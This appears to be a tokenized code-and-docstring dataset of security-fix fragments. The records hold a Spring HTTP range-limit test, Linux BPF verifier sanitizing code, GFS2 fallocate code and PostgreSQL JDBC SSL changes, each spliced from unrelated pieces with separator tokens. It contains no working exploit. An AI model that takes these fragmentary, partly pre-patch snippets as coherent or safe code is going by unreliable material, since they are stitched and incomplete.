"{", "/", "/", "1", ".", "At", "limit", ".", ".", "StringBuilder", "sb", "=", "new", "StringBuilder", "(", "\"", "bytes", "=", "0", "-", "0", "\"", ");", "for", "(", "int", "i", "=", "0", ";", "i", "<", "99", ";", "i", "+", "+)", "{", "sb", ".", "append", "(", "\",", "\")", ".", "append", "(", "i", ")", ".", "append", "(", "\"-", "\")", ".", "append", "(", "i", "+", "1", ")", ";", "}", "List", "<", "HttpRange", ">", "ranges", "=", "HttpRange", ".", "parseRanges", "(", "sb", ".", "toString", "(", "))", ";", "assertEquals", "(", "100", ",", "ranges", ".", "size", "(", "))", ";", "/", "/", "2", ".", "Above", "limit", ".", ".", "sb", "=", "new", "StringBuilder", "(", "\"", "bytes", "=", "0", "-", "0", "\"", ");", "for", "(", "int", "i", "=", "0", ";", "i", "<", "100", ";", "i", "+", "+)", "{", "sb", ".", "append", "(", "\",", "\")", ".", "append", "(", "i", ")", ".", "append", "(", "\"-", "\")", ".", "append", "(", "i", "+", "1", ")", ";", "}", "try", "{", "HttpRange", ".", "parseRanges", "(", "sb", ".", "toString", "(", "))", ";", "fail", "(", ");", "}", "catch", "(", "IllegalArgumentException", "ex", ")", "{", "/", "/", "Expected", "}", "}", "@", "Test", "public", "void", "toResourceRegionsValidations", "(", ")", "{", "byte", "[", "]", "bytes", "=", "\"", "12345", "\"", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ";", "ByteArrayResource", "resource", "=", "new", "ByteArrayResource", "(", "bytes", ")", ";", "/", "/", "1", ".", "Below", "length", "List", "<", "HttpRange", ">", "ranges", "=", "HttpRange", ".", "parseRanges", "(", "\"", "bytes", "=", "0", "-", "1", ",", "2", "-", "3", "\"", ");", "List", "<", "ResourceRegion", ">", "regions", "=", "HttpRange", ".", "toResourceRegions", "(", "ranges", ",", "resource", ")", ";", "assertEquals", "(", "2", ",", "regions", ".", "size", "(", "))", ";", "/", "/", "2", ".", "At", "length", "ranges", "=", "HttpRange", ".", "parseRanges", "(", "\"", "bytes", "=", "0", "-", "1", ",", "2", "-", "4", "\"", ");", "try", "{", "HttpRange", ".", "toResourceRegions", "(", "ranges", ",", "resource", ")", ";", "fail", "(", ");", "}", "catch", "(", "IllegalArgumentException", "ex", ")", "{", "/", "/", "Expected", ".", ".", "}", "}</s>*", "Copyright", "2002", "-", "2017", "the", "original", "author", "or", "authors", ".", "long", "contentLength", "=", "resource", ".", "contentLength", "(", ");", "long", "start", "=", "getRangeStart", "(", "contentLength", ")", ";", "long", "end", "=", "getRangeEnd", "(", "contentLength", ")", ";", "return", "new", "ResourceRegion", "(", "resource", ",", "start", ",", "end", "-", "start", "+", "1", ")", ";", "throw", "new", "IllegalArgumentException", "(", "\"", "Failed", "to", "convert", "Resource", "to", "ResourceRegion", "\"", ",", "ex", ")", ";", "*", "@", "throws", "IllegalArgumentException", "if", "the", "string", "cannot", "be", "parsed", "*", "Copyright", "2002", "-", "2017", "the", "original", "author", "or", "authors", "."], "docstring_tokens": ["adding", "a", "range", "header", "with", "a", "high", "number", "of", "ranges"]}
{"contents": ["empty"], "code_tokens": ["bool", "seen", ";", "/", "*", "this", "insn", "was", "processed", "by", "the", "verifier", "*", "/", "env", "-", ">", "insn_aux_data", "[", "insn_idx", "]", ".", "seen", "=", "true", ";", "env", "-", ">", "insn_aux_data", "[", "insn_idx", "]", ".", "seen", "=", "true", ";", "int", "i", ";", "for", "(", "i", "=", "off", ";", "i", "<", "off", "+", "cnt", "-", "1", ";", "i", "+", "+)", "new_data", "[", "i", "]", ".", "seen", "=", "true", ";", "/", "*", "The", "verifier", "does", "more", "data", "flow", "analysis", "than", "llvm", "and", "will", "not", "explore", "*", "branches", "that", "are", "dead", "at", "run", "time", ".", "Malicious", "programs", "can", "have", "dead", "code", "*", "too", ".", "Therefore", "replace", "all", "dead", "at", "-", "run", "-", "time", "code", "with", "nops", ".", "*", "/", "static", "void", "sanitize_dead_code", "(", "struct", "bpf_verifier_env", "*", "env", ")", "{", "struct", "bpf_insn_aux_data", "*", "aux_data", "=", "env", "-", ">", "insn_aux_data", ";", "struct", "bpf_insn", "nop", "=", "BPF_MOV64_REG", "(", "BPF_REG_0", ",", "BPF_REG_0", ")", ";", "struct", "bpf_insn", "*", "insn", "=", "env", "-", ">", "prog", "-", ">", "insnsi", ";", "const", "int", "insn_cnt", "=", "env", "-", ">", "prog", "-", ">", "len", ";", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "insn_cnt", ";", "i", "+", "+)", "{", "if", "(", "aux_data", "[", "i", "]", ".", "seen", ")", "continue", ";", "memcpy", "(", "insn", "+", "i", ",", "&", "nop", ",", "sizeof", "(", "nop", ")", ");", "}", "}", "if", "(", "ret", "=", "=", "0", ")", "sanitize_dead_code", "(", "env", ")", ";</s>int", "converted_op_size", ";", "/", "*", "the", "valid", "value", "width", "after", "perceived", "conversion", "*", "/"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["/", "*", "truncate", "register", "to", "smaller", "size", "(", "in", "bytes", ")", "*", "must", "be", "called", "with", "size", "<", "BPF_REG_SIZE", "*", "/", "static", "void", "coerce_reg_to_size", "(", "struct", "bpf_reg_state", "*", "reg", ",", "int", "size", ")", "{", "u64", "mask", ";", "/", "*", "clear", "high", "bits", "in", "bit", "representation", "*", "/", "reg", "-", ">", "var_off", "=", "tnum_cast", "(", "reg", "-", ">", "var_off", ",", "size", ")", ";", "/", "*", "fix", "arithmetic", "bounds", "*", "/", "mask", "=", "(", "(", "u64", ")", "1", "<", "<", "(", "size", "*", "8", ")", ")", "-", "1", ";", "if", "(", "(", "reg", "-", ">", "umin_value", "&", "~", "mask", ")", "=", "=", "(", "reg", "-", ">", "umax_value", "&", "~", "mask", ")", ")", "{", "reg", "-", ">", "umin_value", "&", "=", "mask", ";", "reg", "-", ">", "umax_value", "&", "=", "mask", ";", "}", "else", "{", "reg", "-", ">", "umin_value", "=", "0", ";", "reg", "-", ">", "umax_value", "=", "mask", ";", "}", "reg", "-", ">", "smin_value", "=", "reg", "-", ">", "umin_value", ";", "reg", "-", ">", "smax_value", "=", "reg", "-", ">", "umax_value", ";", "}", "coerce_reg_to_size", "(", "&", "regs", "[", "value_regno", "]", ",", "size", ")", ";", "coerce_reg_to_size", "(", "dst_reg", ",", "4", ")", ";", "coerce_reg_to_size", "(", "&", "src_reg", ",", "4", ")", ";", "coerce_reg_to_size", "(", "&", "regs", "[", "insn", "-", ">", "dst_reg", "]", ",", "4", ")", ";</s>regs", "[", "value_regno", "]", ".", "var_off", "=", "tnum_cast", "(", "regs", "[", "value_regno", "]", ".", "var_off", ",", "size", ")", ";", "__update_reg_bounds", "(", "&", "regs", "[", "value_regno", "]", ");", "static", "void", "coerce_reg_to_32", "(", "struct", "bpf_reg_state", "*", "reg", ")", "{", "/", "*", "clear", "high", "32", "bits", "*", "/", "reg", "-", ">", "var_off", "=", "tnum_cast", "(", "reg", "-", ">", "var_off", ",", "4", ")", ";", "/", "*", "Update", "bounds", "*", "/", "__update_reg_bounds", "(", "reg", ")", ";", "}", "coerce_reg_to_32", "(", "dst_reg", ")", ";", "coerce_reg_to_32", "(", "&", "src_reg", ")", ";", "/", "*", "high", "32", "bits", "are", "known", "zero", ".", "*", "/", "regs", "[", "insn", "-", ">", "dst_reg", "]", ".", "var_off", "=", "tnum_cast", "(", "regs", "[", "insn", "-", ">", "dst_reg", "]", ".", "var_off", ",", "4", ")", ";", "__update_reg_bounds", "(", "&", "regs", "[", "insn", "-", ">", "dst_reg", "]", ");"], "docstring_tokens": ["tracing", "actual", "values", "through", "a", "map", "is", "impossible", ")"]}
{"contents": ["empty"], "code_tokens": ["#", "include", "<", "linux", "/", "blkdev", ".", "h", ">", "struct", "super_block", "*", "sb", "=", "sdp", "-", ">", "sd_vfs", ";", "int", "ret", ";", "if", "(", "buffer_zeronew", "(", "bh_map", ")", ")", "{", "ret", "=", "sb_issue_zeroout", "(", "sb", ",", "dblock", ",", "dblks", ",", "GFP_NOFS", ")", ";", "if", "(", "ret", ")", "{", "fs_err", "(", "sdp", ",", "\"", "Failed", "to", "zero", "data", "buffers", "\\", "n", "\"", ");", "clear_buffer_zeronew", "(", "bh_map", ")", ";", "}", "}", "unsigned", "int", "nr_blks", ";", "sector_t", "lblock", "=", "offset", ">", ">", "inode", "-", ">", "i_blkbits", ";", "return", "error", ";", "while", "(", "len", ")", "{", "struct", "buffer_head", "bh_map", "=", "{", ".", "b_state", "=", "0", ",", ".", "b_blocknr", "=", "0", "}", ";", "bh_map", ".", "b_size", "=", "len", ";", "set_buffer_zeronew", "(", "&", "bh_map", ")", ";", "error", "=", "gfs2_block_map", "(", "inode", ",", "lblock", ",", "&", "bh_map", ",", "1", ")", ";", "if", "(", "unlikely", "(", "error", ")", ")", "len", "-", "=", "bh_map", ".", "b_size", ";", "nr_blks", "=", "bh_map", ".", "b_size", ">", ">", "inode", "-", ">", "i_blkbits", ";", "lblock", "+", "=", "nr_blks", ";", "if", "(", "!", "buffer_new", "(", "&", "bh_map", ")", ")", "continue", ";", "if", "(", "unlikely", "(", "!", "buffer_zeronew", "(", "&", "bh_map", ")", "))", "{", "error", "=", "-", "EIO", ";", "goto", "out", ";", "}", "if", "(", "offset", "+", "len", ">", "inode", "-", ">", "i_size", "&", "&", "!", "(", "mode", "&", "FALLOC_FL_KEEP_SIZE", ")", ")", "i_size_write", "(", "inode", ",", "offset", "+", "len", ")", ";", "brelse", "(", "dibh", ")", ";", "loff_t", "max_chunk_size", "=", "UINT_MAX", "&", "bsize_mask", ";", "calc_max_reserv", "(", "ip", ",", "(", "len", ">", "max_chunk_size", ")", "?", "max_chunk_size", ":", "len", ",", "&", "max_bytes", ",", "&", "data_blocks", ",", "&", "ind_blocks", ")", ";", "BH_Zeronew", "=", "BH_PrivateStart", "+", "2", ",", "BUFFER_FNS", "(", "Zeronew", ",", "zeronew", ")", "TAS_BUFFER_FNS", "(", "Zeronew", ",", "zeronew", ")</s>static", "int", "empty_write_end", "(", "struct", "page", "*", "page", ",", "unsigned", "from", ",", "unsigned", "to", ",", "int", "mode", ")", "{", "struct", "inode", "*", "inode", "=", "page", "-", ">", "mapping", "-", ">", "host", ";", "struct", "gfs2_inode", "*", "ip", "=", "GFS2_I", "(", "inode", ")", ";", "struct", "buffer_head", "*", "bh", ";", "unsigned", "offset", ",", "blksize", "=", "1", "<", "<", "inode", "-", ">", "i_blkbits", ";", "pgoff_t", "end_index", "=", "i_size_read", "(", "inode", ")", ">", ">", "PAGE_CACHE_SHIFT", ";", "zero_user", "(", "page", ",", "from", ",", "to", "-", "from", ")", ";", "mark_page_accessed", "(", "page", ")", ";", "if", "(", "page", "-", ">", "index", "<", "end_index", "|", "|", "!", "(", "mode", "&", "FALLOC_FL_KEEP_SIZE", ")", ")", "{", "if", "(", "!", "gfs2_is_writeback", "(", "ip", ")", ")", "gfs2_page_add_databufs", "(", "ip", ",", "page", ",", "from", ",", "to", ")", ";", "block_commit_write", "(", "page", ",", "from", ",", "to", ")", ";", "return", "0", ";", "}", "offset", "=", "0", ";", "bh", "=", "page_buffers", "(", "page", ")", ";", "while", "(", "offset", "<", "to", ")", "{", "if", "(", "offset", ">", "=", "from", ")", "{", "set_buffer_uptodate", "(", "bh", ")", ";", "mark_buffer_dirty", "(", "bh", ")", ";", "clear_buffer_new", "(", "bh", ")", ";", "write_dirty_buffer", "(", "bh", ",", "WRITE", ")", ";", "}", "offset", "+", "=", "blksize", ";", "bh", "=", "bh", "-", ">", "b_this_page", ";", "}", "offset", "=", "0", ";", "bh", "=", "page_buffers", "(", "page", ")", ";", "while", "(", "offset", "<", "to", ")", "{", "if", "(", "offset", ">", "=", "from", ")", "{", "wait_on_buffer", "(", "bh", ")", ";", "if", "(", "!", "buffer_uptodate", "(", "bh", ")", ")", "return", "-", "EIO", ";", "}", "offset", "+", "=", "blksize", ";", "bh", "=", "bh", "-", ">", "b_this_page", ";", "}", "return", "0", ";", "}", "static", "int", "needs_empty_write", "(", "sector_t", "block", ",", "struct", "inode", "*", "inode", ")", "{", "int", "error", ";", "struct", "buffer_head", "bh_map", "=", "{", ".", "b_state", "=", "0", ",", ".", "b_blocknr", "=", "0", "}", ";", "bh_map", ".", "b_size", "=", "1", "<", "<", "inode", "-", ">", "i_blkbits", ";", "error", "=", "gfs2_block_map", "(", "inode", ",", "block", ",", "&", "bh_map", ",", "0", ")", ";", "if", "(", "unlikely", "(", "error", ")", ")", "return", "error", ";", "return", "!", "buffer_mapped", "(", "&", "bh_map", ")", ";", "}", "static", "int", "write_empty_blocks", "(", "struct", "page", "*", "page", ",", "unsigned", "from", ",", "unsigned", "to", ",", "int", "mode", ")", "{", "struct", "inode", "*", "inode", "=", "page", "-", ">", "mapping", "-", ">", "host", ";", "unsigned", "start", ",", "end", ",", "next", ",", "blksize", ";", "sector_t", "block", "=", "page", "-", ">", "index", "<", "<", "(", "PAGE_CACHE_SHIFT", "-", "inode", "-", ">", "i_blkbits", ")", ";", "int", "ret", ";", "blksize", "=", "1", "<", "<", "inode", "-", ">", "i_blkbits", ";", "next", "=", "end", "=", "0", ";", "while", "(", "next", "<", "from", ")", "{", "next", "+", "=", "blksize", ";", "block", "+", "+;", "}", "start", "=", "next", ";", "do", "{", "next", "+", "=", "blksize", ";", "ret", "=", "needs_empty_write", "(", "block", ",", "inode", ")", ";", "if", "(", "unlikely", "(", "ret", "<", "0", ")", ")", "return", "ret", ";", "if", "(", "ret", "=", "=", "0", ")", "{", "if", "(", "end", ")", "{", "ret", "=", "__block_write_begin", "(", "page", ",", "start", ",", "end", "-", "start", ",", "gfs2_block_map", ")", ";", "if", "(", "unlikely", "(", "ret", ")", ")", "return", "ret", ";", "ret", "=", "empty_write_end", "(", "page", ",", "start", ",", "end", ",", "mode", ")", ";", "if", "(", "unlikely", "(", "ret", ")", ")", "return", "ret", ";", "end", "=", "0", ";", "}", "start", "=", "next", ";", "}", "else", "end", "=", "next", ";", "block", "+", "+;", "}", "while", "(", "next", "<", "to", ")", ";", "if", "(", "end", ")", "{", "ret", "=", "__block_write_begin", "(", "page", ",", "start", ",", "end", "-", "start", ",", "gfs2_block_map", ")", ";", "if", "(", "unlikely", "(", "ret", ")", ")", "return", "ret", ";", "ret", "=", "empty_write_end", "(", "page", ",", "start", ",", "end", ",", "mode", ")", ";", "if", "(", "unlikely", "(", "ret", ")", ")", "return", "ret", ";", "}", "return", "0", ";", "}", "u64", "start", "=", "offset", ">", ">", "PAGE_CACHE_SHIFT", ";", "unsigned", "int", "start_offset", "=", "offset", "&", "~", "PAGE_CACHE_MASK", ";", "u64", "end", "=", "(", "offset", "+", "len", "-", "1", ")", ">", ">", "PAGE_CACHE_SHIFT", ";", "pgoff_t", "curr", ";", "struct", "page", "*", "page", ";", "unsigned", "int", "end_offset", "=", "(", "offset", "+", "len", ")", "&", "~", "PAGE_CACHE_MASK", ";", "unsigned", "int", "from", ",", "to", ";", "if", "(", "!", "end_offset", ")", "end_offset", "=", "PAGE_CACHE_SIZE", ";", "goto", "out", ";", "curr", "=", "start", ";", "offset", "=", "start", "<", "<", "PAGE_CACHE_SHIFT", ";", "from", "=", "start_offset", ";", "to", "=", "PAGE_CACHE_SIZE", ";", "while", "(", "curr", "<", "=", "end", ")", "{", "page", "=", "grab_cache_page_write_begin", "(", "inode", "-", ">", "i_mapping", ",", "curr", ",", "AOP_FLAG_NOFS", ")", ";", "if", "(", "unlikely", "(", "!", "page", ")", ")", "{", "error", "=", "-", "ENOMEM", ";", "goto", "out", ";", "}", "if", "(", "curr", "=", "=", "end", ")", "to", "=", "end_offset", ";", "error", "=", "write_empty_blocks", "(", "page", ",", "from", ",", "to", ",", "mode", ")", ";", "if", "(", "!", "error", "&", "&", "offset", "+", "to", ">", "inode", "-", ">", "i_size", "&", "&", "!", "(", "mode", "&", "FALLOC_FL_KEEP_SIZE", ")", ")", "{", "i_size_write", "(", "inode", ",", "offset", "+", "to", ")", ";", "}", "unlock_page", "(", "page", ")", ";", "page_cache_release", "(", "page", ")", ";", "if", "(", "error", ")", "curr", "+", "+;", "offset", "+", "=", "PAGE_CACHE_SIZE", ";", "from", "=", "0", ";", "brelse", "(", "dibh", ")", ";", "calc_max_reserv", "(", "ip", ",", "len", ",", "&", "max_bytes", ",", "&", "data_blocks", ",", "&", "ind_blocks", ")", ";"], "docstring_tokens": ["by", "preallocating", "blocks", "in", "certain", "situations", "involving", "insufficient", "memory", "."]}
{"contents": ["empty"], "code_tokens": ["enable_ssl_property", "\"", "enable_ssl_tests", "\"", "|", "sslfactoryarg", "(", "deprecated", ")", "|", "String", "|", "null", "|", "Argument", "forwarded", "to", "constructor", "of", "SSLSocketFactory", "class", ".", "|", "|", "socketFactoryArg", "(", "deprecated", ")", "|", "String", "|", "null", "|", "Argument", "forwarded", "to", "constructor", "of", "SocketFactory", "class", ".", "|", "sslpassword", "=", "sslpwd", "@", "@", "-", "1", ",", "57", "+", "0", ",", "0", "@", "@", "To", "run", "the", "SSL", "tests", ",", "the", "following", "properties", "are", "used", ":", "*", "certdir", ":", "directory", "where", "the", "certificates", "and", "keys", "are", "store", "*", "enable_ssl_tests", ":", "enables", "SSL", "tests", "In", "order", "to", "configure", "PostgreSQL", "for", "SSL", "tests", ",", "the", "following", "changes", "should", "be", "applied", ":", "*", "Copy", "server", "/", "server", ".", "crt", ",", "server", "/", "server", ".", "key", ",", "and", "server", "/", "root", ".", "crt", "to", "$", "PGDATA", "directory", "*", "In", "$", "PGDATA", "directory", ":", "chmod", "0600", "server", ".", "crt", "server", ".", "key", "root", ".", "crt", "*", "Set", "ssl", "=", "on", "in", "postgresql", ".", "conf", "*", "Set", "ssl_cert_file", "=", "server", ".", "crt", "in", "postgresql", ".", "conf", "*", "Set", "ssl_key_file", "=", "server", ".", "key", "in", "postgresql", ".", "conf", "*", "Set", "ssl_ca_file", "=", "root", ".", "crt", "in", "postgresql", ".", "conf", "*", "Add", "databases", "for", "SSL", "tests", ".", "Note", ":", "sslinfo", "extension", "is", "used", "in", "tests", "to", "tell", "if", "connection", "is", "using", "SSL", "or", "not", "for", "db", "in", "hostssldb", "hostnossldb", "certdb", "hostsslcertdb", ";", "do", "createdb", "$", "db", "psql", "$", "db", "-", "c", "\"", "create", "extension", "sslinfo", "\"", "done", "*", "Add", "test", "databases", "to", "pg_hba", ".", "conf", ".", "If", "you", "do", "not", "overwrite", "the", "pg_hba", ".", "conf", "then", "remember", "to", "comment", "out", "all", "lines", "starting", "with", "\"", "host", "all", "\"", ".", "*", "Uncomment", "enable_ssl_tests", "=", "true", "in", "ssltests", ".", "properties", "*", "The", "username", "for", "connecting", "to", "postgres", "as", "specified", "in", "build", ".", "local", ".", "properties", "tests", "has", "to", "be", "\"", "test", "\"", ".", "This", "directory", "contains", "example", "certificates", "generated", "by", "the", "following", "commands", ":", "openssl", "req", "-", "x509", "-", "newkey", "rsa", ":", "1024", "-", "days", "3650", "-", "keyout", "goodclient", ".", "key", "-", "out", "goodclient", ".", "crt", "#", "Common", "name", "is", "test", ",", "password", "is", "sslpwd", "openssl", "req", "-", "x509", "-", "newkey", "rsa", ":", "1024", "-", "days", "3650", "-", "keyout", "badclient", ".", "key", "-", "out", "badclient", ".", "crt", "#", "Common", "name", "is", "test", ",", "password", "is", "sslpwd", "openssl", "req", "-", "x509", "-", "newkey", "rsa", ":", "1024", "-", "days", "3650", "-", "nodes", "-", "keyout", "badroot", ".", "key", "-", "out", "badroot", ".", "crt", "#", "Common", "name", "is", "localhost", "rm", "badroot", ".", "key", "openssl", "pkcs8", "-", "topk8", "-", "in", "goodclient", ".", "key", "-", "out", "goodclient", ".", "pk8", "-", "outform", "DER", "-", "v1", "PBE", "-", "MD5", "-", "DES", "openssl", "pkcs8", "-", "topk8", "-", "in", "badclient", ".", "key", "-", "out", "badclient", ".", "pk8", "-", "outform", "DER", "-", "v1", "PBE", "-", "MD5", "-", "DES", "cp", "goodclient", ".", "crt", "server", "/", "root", ".", "crt", "cd", "server", "openssl", "req", "-", "x509", "-", "newkey", "rsa", ":", "1024", "-", "nodes", "-", "days", "3650", "-", "keyout", "server", ".", "key", "-", "out", "server", ".", "crt", "cp", "server", ".", "crt", ".", "./", "goodroot", ".", "crt", "#", "Common", "name", "is", "localhost", ",", "no", "password", "@", "@", "-", "88", ",", "7", "+", "88", ",", "7", "@", "@", "Connection", "conn", "=", "DriverManager", ".", "getConnection", "(", "url", ")", ";", "*", "*", "*", "sslfactoryarg", "*", "*", "(", "deprecated", ")", "=", "String", "*", "*", "*", "socketFactoryArg", "*", "*", "(", "deprecated", ")", "=", "String", "*", "Control", "use", "of", "SSL", ":", "empty", "or", "{", "@", "code", "true", "}", "values", "imply", "{", "@", "code", "sslmode", "=", "=", "verify", "-", "full", "}", "*", "Parameter", "governing", "the", "use", "of", "SSL", ".", "The", "allowed", "values", "are", "{", "@", "code", "disable", "}", ",", "{", "@", "code", "allow", "}", ",", "*", "{", "@", "code", "prefer", "}", ",", "{", "@", "code", "require", "}", ",", "{", "@", "code", "verify", "-", "ca", "}", ",", "{", "@", "code", "verify", "-", "full", "}", ".", "*", "If", "{", "@", "code", "ssl", "}", "property", "is", "empty", "or", "set", "to", "{", "@", "code", "true", "}", "it", "implies", "{", "@", "code", "verify", "-", "full", "}", ".", "*", "Default", "mode", "is", "\"", "require", "\"", "SSL_MODE", "(", "\"", "sslmode", "\"", ",", "null", ",", "\"", "Parameter", "governing", "the", "use", "of", "SSL", "\"", ",", "false", ",", "\"", "disable", "\"", ",", "\"", "allow", "\"", ",", "\"", "prefer", "\"", ",", "\"", "require", "\"", ",", "\"", "verify", "-", "ca", "\"", ",", "\"", "verify", "-", "full", "\"", "),", "*", "@", "deprecated", "use", "{", "@", "code", ".", ".", "Factory", "(", "Properties", ")", "}", "constructor", ".", "@", "Deprecated", "*", "@", "deprecated", "use", "{", "@", "code", ".", ".", "Factory", "(", "Properties", ")", "}", "constructor", ".", "@", "Deprecated", "import", "java", ".", "net", ".", "SocketTimeoutException", ";", "if", "(", "pg_input", ".", "available", "(", ")", ">", "0", ")", "{", "return", "true", ";", "}", "/", "/", "In", "certain", "cases", ",", "available", "returns", "0", ",", "yet", "there", "are", "bytes", "int", "soTimeout", "=", "getNetworkTimeout", "(", ");", "setNetworkTimeout", "(", "1", ")", ";", "try", "{", "return", "pg_input", ".", "peek", "(", ")", "!", "=", "-", "1", ";", "}", "catch", "(", "SocketTimeoutException", "e", ")", "{", "return", "false", ";", "}", "finally", "{", "setNetworkTimeout", "(", "soTimeout", ")", ";", "}", "import", "org", ".", "postgresql", ".", "ssl", ".", "LibPQFactory", ";", "import", "javax", ".", "net", ".", "ssl", ".", "SSLSocketFactory", ";", "/", "**", "*", "Instantiates", "{", "@", "link", "SSLSocketFactory", "}", "based", "on", "the", "{", "@", "link", "PGProperty", "#", "SSL_FACTORY", "}", ".", "*", "*", "@", "param", "info", "connection", "properties", "*", "@", "return", "SSL", "socket", "factory", "*", "@", "throws", "PSQLException", "if", "something", "goes", "wrong", "*", "/", "public", "static", "SSLSocketFactory", "getSslSocketFactory", "(", "Properties", "info", ")", "throws", "PSQLException", "{", "String", "classname", "=", "PGProperty", ".", "SSL_FACTORY", ".", "get", "(", "info", ")", ";", "if", "(", "classname", "=", "=", "null", "|", "|", "\"", "org", ".", "postgresql", ".", "ssl", ".", "jdbc4", ".", "LibPQFactory", "\"", ".", "equals", "(", "classname", ")", "|", "|", "\"", "org", ".", "postgresql", ".", "ssl", ".", "LibPQFactory", "\"", ".", "equals", "(", "classname", ")", ")", "{", "return", "new", "LibPQFactory", "(", "info", ")", ";", "}", "try", "{", "return", "(", "SSLSocketFactory", ")", "ObjectFactory", ".", "instantiate", "(", "classname", ",", "info", ",", "true", ",", "PGProperty", ".", "SSL_FACTORY_ARG", ".", "get", "(", "info", ")", ");", "}", "catch", "(", "Exception", "e", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "The", "SSLSocketFactory", "class", "provided", "{", "0", "}", "could", "not", "be", "instantiated", ".", "\",", "classname", ")", ",", "PSQLState", ".", "CONNECTION_FAILURE", ",", "e", ")", ";", "}", "}", "import", "org", ".", "postgresql", ".", "jdbc", ".", "SslMode", ";", "private", "PGStream", "tryConnect", "(", "String", "user", ",", "String", "database", ",", "Properties", "info", ",", "SocketFactory", "socketFactory", ",", "HostSpec", "hostSpec", ",", "SslMode", "sslMode", ")", "throws", "SQLException", ",", "IOException", "{", "int", "connectTimeout", "=", "PGProperty", ".", "CONNECT_TIMEOUT", ".", "getInt", "(", "info", ")", "*", "1000", ";", "PGStream", "newStream", "=", "new", "PGStream", "(", "socketFactory", ",", "hostSpec", ",", "connectTimeout", ")", ";", "/", "/", "Construct", "and", "send", "an", "ssl", "startup", "packet", "if", "requested", ".", "newStream", "=", "enableSSL", "(", "newStream", ",", "sslMode", ",", "info", ",", "connectTimeout", ")", ";", "/", "/", "Set", "the", "socket", "timeout", "if", "the", "\"", "socketTimeout", "\"", "property", "has", "been", "set", ".", "int", "socketTimeout", "=", "PGProperty", ".", "SOCKET_TIMEOUT", ".", "getInt", "(", "info", ")", ";", "if", "(", "socketTimeout", ">", "0", ")", "{", "newStream", ".", "getSocket", "(", ").", "setSoTimeout", "(", "socketTimeout", "*", "1000", ")", ";", "}", "/", "/", "Enable", "TCP", "keep", "-", "alive", "probe", "if", "required", ".", "boolean", "requireTCPKeepAlive", "=", "PGProperty", ".", "TCP_KEEP_ALIVE", ".", "getBoolean", "(", "info", ")", ";", "newStream", ".", "getSocket", "(", ").", "setKeepAlive", "(", "requireTCPKeepAlive", ")", ";", "/", "/", "Try", "to", "set", "SO_SNDBUF", "and", "SO_RECVBUF", "socket", "options", ",", "if", "requested", ".", "/", "/", "If", "receiveBufferSize", "and", "send_buffer_size", "are", "set", "to", "a", "value", "greater", "/", "/", "than", "0", ",", "adjust", ".", "-", "1", "means", "use", "the", "system", "default", ",", "0", "is", "ignored", "since", "not", "/", "/", "supported", ".", "/", "/", "Set", "SO_RECVBUF", "read", "buffer", "size", "int", "receiveBufferSize", "=", "PGProperty", ".", "RECEIVE_BUFFER_SIZE", ".", "getInt", "(", "info", ")", ";", "if", "(", "receiveBufferSize", ">", "-", "1", ")", "{", "/", "/", "value", "of", "0", "not", "a", "valid", "buffer", "size", "value", "if", "(", "receiveBufferSize", ">", "0", ")", "{", "newStream", ".", "getSocket", "(", ").", "setReceiveBufferSize", "(", "receiveBufferSize", ")", ";", "LOGGER", ".", "log", "(", "Level", ".", "WARNING", ",", "\"", "Ignore", "invalid", "value", "for", "receiveBufferSize", ":", "{", "0", "}", "\",", "receiveBufferSize", ")", ";", "/", "/", "Set", "SO_SNDBUF", "write", "buffer", "size", "int", "sendBufferSize", "=", "PGProperty", ".", "SEND_BUFFER_SIZE", ".", "getInt", "(", "info", ")", ";", "if", "(", "sendBufferSize", ">", "-", "1", ")", "{", "if", "(", "sendBufferSize", ">", "0", ")", "{", "newStream", ".", "getSocket", "(", ").", "setSendBufferSize", "(", "sendBufferSize", ")", ";", "}", "else", "{", "LOGGER", ".", "log", "(", "Level", ".", "WARNING", ",", "\"", "Ignore", "invalid", "value", "for", "sendBufferSize", ":", "{", "0", "}", "\",", "sendBufferSize", ")", ";", "}", "}", "if", "(", "LOGGER", ".", "isLoggable", "(", "Level", ".", "FINE", ")", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "Receive", "Buffer", "Size", "is", "{", "0", "}", "\",", "newStream", ".", "getSocket", "(", ").", "getReceiveBufferSize", "(", "))", ";", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "Send", "Buffer", "Size", "is", "{", "0", "}", "\",", "newStream", ".", "getSocket", "(", ").", "getSendBufferSize", "(", "))", ";", "}", "List", "<", "String", "[", "]>", "paramList", "=", "getParametersForStartup", "(", "user", ",", "database", ",", "info", ")", ";", "sendStartupPacket", "(", "newStream", ",", "paramList", ")", ";", "/", "/", "Do", "authentication", "(", "until", "AuthenticationOk", ")", ".", "doAuthentication", "(", "newStream", ",", "hostSpec", ".", "getHost", "(", "),", "user", ",", "info", ")", ";", "return", "newStream", ";", "}", "@", "Override", "public", "QueryExecutor", "openConnectionImpl", "(", "HostSpec", "[", "]", "hostSpecs", ",", "String", "user", ",", "String", "database", ",", "Properties", "info", ")", "throws", "SQLException", "{", "SslMode", "sslMode", "=", "SslMode", ".", "of", "(", "info", ")", ";", "try", "{", "newStream", "=", "tryConnect", "(", "user", ",", "database", ",", "info", ",", "socketFactory", ",", "hostSpec", ",", "sslMode", ")", ";", "}", "catch", "(", "SQLException", "e", ")", "{", "if", "(", "sslMode", "=", "=", "SslMode", ".", "PREFER", "&", "&", "PSQLState", ".", "INVALID_AUTHORIZATION_SPECIFICATION", ".", "getState", "(", ").", "equals", "(", "e", ".", "getSQLState", "(", "))", ")", "{", "/", "/", "Try", "non", "-", "SSL", "connection", "to", "cover", "case", "like", "\"", "non", "-", "ssl", "only", "db", "\"", "/", "/", "Note", ":", "PREFER", "allows", "loss", "of", "encryption", ",", "so", "no", "significant", "harm", "is", "made", "Throwable", "ex", "=", "null", ";", "try", "{", "newStream", "=", "tryConnect", "(", "user", ",", "database", ",", "info", ",", "socketFactory", ",", "hostSpec", ",", "SslMode", ".", "DISABLE", ")", ";", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "Downgraded", "to", "non", "-", "encrypted", "connection", "for", "host", "{", "0", "}", "\",", "hostSpec", ")", ";", "}", "catch", "(", "SQLException", "ee", ")", "{", "ex", "=", "ee", ";", "}", "catch", "(", "IOException", "ee", ")", "{", "ex", "=", "ee", ";", "/", "/", 